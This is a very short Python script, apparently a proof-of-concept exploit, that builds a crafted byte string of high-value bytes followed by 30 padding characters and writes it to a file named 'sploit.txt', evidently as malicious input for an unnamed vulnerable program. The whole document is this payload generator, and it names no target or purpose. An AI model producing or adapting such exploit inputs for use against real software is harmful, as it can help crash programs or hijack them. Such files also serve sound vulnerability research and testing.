import struct
def main():
    payload = "/\xff-\xff+\xdf%\x06"+"X"*30
    fp = open("sploit.txt","wb")
    fp.write(payload)
    fp.close()


main()
